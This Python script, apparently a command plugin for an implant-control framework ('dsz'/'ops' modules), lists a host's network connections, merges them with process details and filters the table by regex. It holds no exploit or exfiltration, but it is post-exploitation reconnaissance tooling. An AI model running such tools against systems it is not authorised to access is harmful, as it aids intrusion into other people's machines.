
import dsz
import traceback, sys
import re
import ops.cmd
import os.path
from ops.pprint import pprint

def main():
    connection_list = []
    proc_list = []
    ppid = ''
    path = ''
    user = ''
    if (len(sys.argv) > 1):
        pattern = (('.*' + sys.argv[1]) + '.*')
    else:
        pattern = '.*'
    print (('\nFiltering connections with regex:: ' + pattern) + '\n')
    regex = re.compile(pattern, (re.I | re.UNICODE))
    dsz.control.echo.Off()
    cmd = ops.cmd.getDszCommand('netconnections -list')
    conn_items = cmd.execute()
    if cmd.success:
        proc_list = getProcList()
        for conn_item in conn_items.initialconnectionlistitem.connectionitem:
            type = conn_item.type.encode('utf-8')
            pid = str(conn_item.pid)
            state = conn_item.state.encode('utf-8')
            valid = conn_item.valid
            remote_type = str(conn_item.remote.type)
            remote_port = str(conn_item.remote.port)
            remote_address = str(conn_item.remote.address)
            local_type = conn_item.local.type.encode('utf-8')
            local_port = str(conn_item.local.port)
            local_address = str(conn_item.local.address)
            print_local_address = ''
            if ((len(local_address) > 0) and (local_address != 'None')):
                print_local_address = ((local_address + ':') + local_port)
            else:
                print_local_address = '*.*'
            if ((len(remote_address) > 0) and (remote_address != 'None')):
                print_remote_address = ((remote_address + ':') + remote_port)
            else:
                print_remote_address = '*.*'
            connection = [type, print_local_address, print_remote_address, state, pid, ppid, path, user]
            mergeProcessInfo(connection, proc_list)
            if regex:
                tmp_str = ' '.join(connection)
                if re.search(regex, tmp_str):
                    connection_list.append(connection)
    if (connection_list > 1):
        pprint(connection_list, header=['TYPE', 'LOCAL', 'REMOTE', 'STATE', 'PID', 'PPID', 'PATH', 'USER'])
    dsz.control.echo.On()

def getProcList():
    cmd = ops.cmd.getDszCommand('processes -list')
    proc_items = cmd.execute()
    retval = []
    if cmd.success:
        for proc_item in proc_items.initialprocesslistitem.processitem:
            process = [str(proc_item.id), str(proc_item.parentid), str(proc_item.path.encode('utf-8')), str(proc_item.name.encode('utf-8')), str(proc_item.user.encode('utf-8'))]
            retval.append(process)
    else:
        dsz.ui.Echo('Could not find any processes.', dsz.ERROR)
        return 0
    return retval

def mergeProcessInfo(connection, proc_list):
    if (proc_list == 0):
        dsz.ui.Echo('Could not find any processes.', dsz.ERROR)
        return 0
    if (connection != None):
        for process in filter((lambda x: (x[0] == connection[4])), proc_list):
            connection[5] = process[1].encode('utf-8')
            connection[6] = os.path.join(process[2], str(process[3]))
            connection[7] = process[4]
    else:
        dsz.ui.Echo('Could not find any processes.', dsz.ERROR)
        return 0
    return connection
if (__name__ == '__main__'):
    usage = 'nsg [regex]\n            '
    try:
        main()
    except RuntimeError as e:
        dsz.ui.Echo(('\n RuntimeError Occured: %s' % e), dsz.ERROR)